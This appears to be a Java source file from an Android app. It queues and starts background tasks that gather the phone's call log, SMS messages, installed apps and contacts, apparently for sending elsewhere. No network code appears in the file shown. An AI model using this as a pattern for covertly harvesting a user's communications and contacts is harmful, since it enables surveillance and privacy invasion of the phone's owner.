package com.inet.android.list;

import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

public class TurnSendList {
	private static final String LOG_TAG = "TurnSendList";
	int list;
	Context mContext;
	SharedPreferences sp;
	Editor ed;
	String value;
	String busy;
	public TurnSendList(Context mContext) {
		this.mContext = mContext;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();

	}

	public void setList(int list, String value, String busy) {
		this.list = list;
		this.value = value;
		this.busy = busy;
		
		if(busy != null)
			ed.putString("busy", busy);
		
		switch (list) {
		case 1:
			ed.putString("list_call", value);
			Logging.doLog(LOG_TAG, "list_call = " + value, "list_call = "
					+ value);

			break;
		case 2:
			ed.putString("list_sms", value);
			Logging.doLog(LOG_TAG, "list_sms = " + value, "list_sms = " + value);

			break;
		case 3:
			ed.putString("list_app", value);
			Logging.doLog(LOG_TAG, "list_app = " + value, "list_app = " + value);

			break;
		case 4:
			ed.putString("list_contact", value);
			Logging.doLog(LOG_TAG, "list_contact = " + value, "list_contact = "
					+ value);
			break;
			default:
				Logging.doLog(LOG_TAG, "list_default = " + value, "list_contact = "
						+ value);
		}
		ed.commit();
		startGetList();
	}

	public void startGetList() {
		Logging.doLog(LOG_TAG, "startGetList() ", "startGetList() ");
		if (sp.getString("busy", "0").equals("0")) {
			Logging.doLog(LOG_TAG, "busy = " + sp.getString("busy", "0"), "busy = "
					+ sp.getString("busy", "0"));
			if (sp.getString("list_call", "0").equals("1")) {
				Logging.doLog(LOG_TAG, "list_call go", "list_call go");
				ed.putString("busy", "1");
				ed.commit();
				ListCall arhCall = new ListCall();
				arhCall.execute(mContext);
				return;
			} else if (sp.getString("list_sms", "0").equals("1")) {
				Logging.doLog(LOG_TAG, "list_sms go", "list_sms go");
				ed.putString("busy", "1");
				ed.commit();
				ListSms arhSms = new ListSms();
				arhSms.execute(mContext);
				return;
			} else if (sp.getString("list_app", "0").equals("1")) {
				Logging.doLog(LOG_TAG, "list_app go", "list_app go");
				ed.putString("busy", "1");
				ed.commit();
				ListApp listApp = new ListApp();
				listApp.getListOfInstalledApp(mContext);
				return;
			} else if (sp.getString("list_contact", "0").equals("1")) {
				Logging.doLog(LOG_TAG, "list_contact go", "list_contact go");
				ed.putString("busy", "1");
				ed.commit();
				ListContacts getCont = new ListContacts();
				getCont.execute(mContext);
				return;
			}
		}
	}

	public void setBusy(String busy) {
		ed.putString("busy", busy);

	}

}
